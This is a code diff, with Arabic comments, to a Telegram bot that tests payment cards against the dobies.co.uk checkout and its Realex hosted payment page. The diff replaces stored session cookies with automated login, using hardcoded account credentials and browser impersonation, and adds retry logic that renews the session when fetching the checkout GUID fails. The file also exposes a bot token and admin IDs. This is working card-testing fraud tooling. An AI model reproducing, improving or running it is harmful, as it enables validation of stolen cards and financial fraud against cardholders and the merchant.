@@ -3,6 +3,7 @@ import asyncio
 import json
 import re
 import os
+import time
 from datetime import datetime
 
 from curl_cffi import requests as curl_requests
@@ -14,46 +15,75 @@ from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQu
 BOT_TOKEN  = "8334507568:AAEJakB6G_kPVNOX6r3vZGc8ZqcLPhOmCLM"
 ADMIN_IDS  = [5895491379, 6220135474, 844663875]
 
-# ========== COOKIES (dobies) ==========
-COOKIES = {
-        'WISH': '%5B%5D',
-    'GIFTS': '%5B%5D',
-    'SEEDSACCESS': '1',
-    '__attentive_id': 'c6d670aae8d94404bbbd20e7d8e1dbb2',
-    '_attn_': 'eyJ1Ijoie1wiY29cIjoxNzY4Mzk2NTI2MzIwLFwidW9cIjoxNzY4Mzk2NTI2MzIwLFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcImM2ZDY3MGFhZThkOTQ0MDRiYmJkMjBlN2Q4ZTFkYmIyXCJ9In0=',
-    '__attentive_cco': '1768396526324',
-    'sqzllocal': 'sqzl696796ef000006abbcf1',
-    'CookieConsent': '{stamp:%27HGr2eSH6AgykBlxBO1HAV2WzMb1be5Mmi0wvYOiz/pnjmHb1FhtYyA==%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cmethod:%27implied%27%2Cver:1%2Cutc:1771221659711%2Cregion:%27eg%27}',
-    '_ga': 'GA1.1.1632777576.1771221657',
-    'sf_id': 'a7959685-6e26-4523-a312-9512c87eca59',
-    'unbxd.userId': 'uid-1771416390478-5891',
-    'attntv_mstore_email': '2pefzuby3klhbyz8k9lr690@tnbeta.com:0',
-    'BASKETPOP': 'seen',
-    'language': 'en_GB',
-    'ledgerCurrency': 'GBP',
-    'apay-session-set': 'zHJNijLVBnZw%2F30y%2Fqw%2BmBcx5VuFOOvdm7yZ5jMV4iqNKYJFGJbqwbwk0Ou9zNA%3D',
-    'PC': 'AB11%206UU',
-    'CFCLIENT_DOBIES': 'basket%3D%5B%7B%22S%22%3A%22KH9100%22%2C%22Q%22%3A1%7D%2C%7B%22S%22%3A%2210672%22%2C%22Q%22%3A1%7D%2C%7B%22S%22%3A%2282337%22%2C%22Q%22%3A1%7D%2C%7B%22S%22%3A%22780352%22%2C%22Q%22%3A1%7D%5D%23',
-    'ServerID': '1026',
-    '__attentive_dv': '1',
-    'CFID': 'Z2xf40m81pc0g6zzrb1cnsaxp1nfu6d6v3prpe6ibgaanox4izi-3068144',
-    'CFTOKEN': 'Z2xf40m81pc0g6zzrb1cnsaxp1nfu6d6v3prpe6ibgaanox4izi-4229b10241d9ad9-EE18A655-A351-984D-4F100454BBE35998',
-    '__cf_bm': 'YMKatQxNlUhGn_bQQ.XUcAF_DujXG3oOXvis_eVqzXo-1771644008-1.0.1.1-d_9tCa4N1bVEOo0.WLhBR8VDszKoF47OxY7b4p16AdqjX2Y3IMhQhK.FdqOxn.7UR6y1RgrDCj1Reyb0xkXVX9hj9lPXQxbauG.ACbHNZdM',
-    'sf_session_ses.fe49': '*',
-    'unbxd.visit': 'repeat',
-    'unbxd.visitId': 'visitId-1771644009043-33154',
-    'sqzl_session_id': '69992469000004aefae0%7C1771644009.823',
-    '__attentive_session_id': '34c1c6f30f9e4995a24dfdaf60908640',
-    '__attentive_ss_referrer': 'https://www.dobies.co.uk/basket',
-    '_gcl_au': '1.1.593939721.1771221660.1877567675.1771644015.1771644019',
-    'sf_session_id.fe49': 'fa3e23da-1011-4f20-801f-1c26f8a30556.1771221661.19.1771644151.1771640534.3c006bba-3891-45f1-9e71-40ee72a895bb',
-    '_uetsid': '43054a900cc211f19c717b925771475e',
-    '_uetvid': '17b486f0f14b11f08c2db9f511460024',
-    '__attentive_pv': '5',
-    'CFGLOBALS': 'urltoken%3DCFID%23%3D3068144%26CFTOKEN%23%3D4229b10241d9ad9%2DEE18A655%2DA351%2D984D%2D4F100454BBE35998%23lastvisit%3D%7Bts%20%272026%2D02%2D21%2003%3A22%3A30%27%7D%23hitcount%3D233%23timecreated%3D%7Bts%20%272026%2D01%2D14%2013%3A15%3A19%27%7D%23cftoken%3D4229b10241d9ad9%2DEE18A655%2DA351%2D984D%2D4F100454BBE35998%23cfid%3D3068144%23',
-    '_ga_VHS6WH9RZL': 'GS2.1.s1771644009$o10$g1$t1771644152$j46$l0$h1492059094',
-}
+LOGIN_EMAIL    = "2pefzuby3klhbyz8k9lr690@tnbeta.com"
+LOGIN_PASSWORD = "111222333mM"
 
+# ========== AUTO LOGIN ==========
+dobies_session = None
+
+def do_login():
+    """يسجل الدخول ويرجع session فيها كوكيز حقيقية"""
+    global dobies_session
+    print("[*] جاري تسجيل الدخول للحصول على كوكيز جديدة...")
+
+    session = curl_requests.Session(impersonate="chrome120")
+
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'accept-language': 'en-GB,en;q=0.9',
+        'origin': 'https://www.dobies.co.uk',
+        'referer': 'https://www.dobies.co.uk/sign-in',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    }
+
+    try:
+        session.get('https://www.dobies.co.uk/', headers=headers, timeout=20)
+        time.sleep(1)
+        session.get('https://www.dobies.co.uk/sign-in', headers=headers, timeout=20)
+        time.sleep(1)
+
+        session.post(
+            'https://www.dobies.co.uk/sign-in',
+            headers=headers,
+            data={'EmailAddress': LOGIN_EMAIL, 'Password': LOGIN_PASSWORD},
+            allow_redirects=True,
+            timeout=20,
+        )
+        time.sleep(1)
+
+        account = session.get(
+            'https://www.dobies.co.uk/account-management',
+            headers={**headers, 'referer': 'https://www.dobies.co.uk/sign-in'},
+            timeout=20,
+        )
+
+        if 'My Account' in account.text:
+            dobies_session = session
+            print("[+] تسجيل الدخول ناجح! تم تحديث الكوكيز.")
+            return True
+        else:
+            print("[-] فشل تسجيل الدخول!")
+            return False
+
+    except Exception as e:
+        print(f"[-] خطأ في اللوجين: {e}")
+        return False
+
+
+def get_cookies_dict():
+    """يرجع الكوكيز كـ dict"""
+    global dobies_session
+    if dobies_session is None:
+        do_login()
+    return dict(dobies_session.cookies) if dobies_session else {}
+
+
+# تسجيل الدخول عند بدء البوت
+do_login()
+
+
+# ========== HEADERS ==========
 CHECKOUT_HEADERS = {
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
@@ -142,6 +172,42 @@ def base_card_data(cc, guid):
         'hppInstallmentPlanId': '', 'hppInstallmentTcVersion': '', 'hppInstallmentTcLang': '',
     }
 
+# ========== GET GUID مع تجديد تلقائي ==========
+async def get_guid_with_retry(loop, stats, max_retries=2):
+    """
+    يحاول يجلب GUID، لو فشل يجدد الكوكيز ويحاول تاني
+    """
+    for attempt in range(max_retries):
+        cookies = get_cookies_dict()
+
+        resp = await loop.run_in_executor(None, lambda: curl_requests.get(
+            'https://www.dobies.co.uk/checkout/delivery',
+            cookies=cookies,
+            headers=CHECKOUT_HEADERS,
+            impersonate="chrome120",
+            timeout=30,
+        ))
+
+        guid_match = re.search(r'card\.html\?guid=([\w-]+)', resp.text)
+        guid = guid_match.group(1) if guid_match else None
+
+        if guid:
+            return guid
+
+        # فشل جلب GUID - نجدد الكوكيز
+        print(f"[!] فشل جلب GUID (محاولة {attempt+1}/{max_retries}) - جاري تجديد الكوكيز...")
+        stats['last_response'] = f'GUID Error - تجديد كوكيز ({attempt+1})'
+
+        # تجديد اللوجين في executor عشان ما يبلوك الـ event loop
+        login_ok = await loop.run_in_executor(None, do_login)
+        if not login_ok:
+            print("[-] فشل تجديد اللوجين!")
+
+        await asyncio.sleep(2)
+
+    return None
+
+
 # ========== CARD CHECKER ==========
 async def check_card(card, bot_app, user_id):
     stats = get_user_stats(user_id)
@@ -158,21 +224,14 @@ async def check_card(card, bot_app, user_id):
     mmyy = f"{mm}/{yy2}"
 
     try:
-        # STEP 1 - Get GUID
         loop = asyncio.get_event_loop()
-        resp = await loop.run_in_executor(None, lambda: curl_requests.get(
-            'https://www.dobies.co.uk/checkout/delivery',
-            cookies=COOKIES,
-            headers=CHECKOUT_HEADERS,
-            impersonate="chrome110",
-            timeout=30,
-        ))
 
-        guid_match = re.search(r'card\.html\?guid=([\w-]+)', resp.text)
-        guid = guid_match.group(1) if guid_match else None
+        # STEP 1 - Get GUID مع retry تلقائي
+        guid = await get_guid_with_retry(loop, stats)
+
         if not guid:
             stats['errors'] += 1
-            stats['last_response'] = 'GUID Error'
+            stats['last_response'] = 'GUID Error - فشل نهائي'
             return card, "ERROR"
 
         referer = f'https://pay.realexpayments.com/hosted-payments/blue/card.html?guid={guid}'
